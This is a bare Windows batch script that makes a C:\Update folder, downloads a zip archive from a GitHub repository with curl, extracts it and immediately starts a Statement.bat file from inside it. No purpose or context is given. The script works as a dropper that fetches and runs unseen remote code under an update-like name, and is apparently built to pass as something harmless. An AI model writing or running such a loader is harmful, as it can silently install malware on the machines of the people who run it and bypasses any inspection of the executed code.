@echo off
cd "C:\" 
md Update
cd "C:\Update\

curl https://github.com/samiganja2022/C0D3D/raw/main/Base.zip -O -J -L

tar -xf Base.zip

start Statement.bat






